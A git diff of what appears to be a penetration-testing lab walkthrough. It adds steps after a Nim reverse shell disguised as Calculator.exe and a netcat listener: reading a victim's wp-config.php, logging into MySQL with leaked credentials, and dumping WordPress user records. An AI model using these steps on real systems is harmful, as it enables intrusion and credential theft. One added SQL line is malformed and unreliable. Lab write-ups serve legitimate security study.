@@ -165,6 +165,10 @@ subl rev_shell.nim
 /root/.nimble/bin/nim c -d:mingw  --app:gui --opt:speed -o:Calculator.exe rev_shell.nim
 ```
 
+<figure><img src="../../.gitbook/assets/image (993).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (994).png" alt=""><figcaption></figcaption></figure>
+
 **Kali #2**
 
 ```
@@ -173,9 +177,31 @@ rlwrap nc -lvnp 443
 
 <figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
+**Victim**
 
+```
+type C:\xampp\htdocs\gift\wp-config.php
+```
 
-#### &#x20;<a href="#transfer-winpeas" id="transfer-winpeas"></a>
+<figure><img src="../../.gitbook/assets/image (995).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+apt install mysql-client-core-5.7   
+mysql -h$VICTIM -ugift -pSurpriseMF
+```
+
+**Kali(mysql)**
+
+```
+select * from mysql -h$VICTIM -ugift -pSurpriseMF
+use gift;
+show tables;
+select * from wp_users;
+```
+
+<figure><img src="../../.gitbook/assets/image (992).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
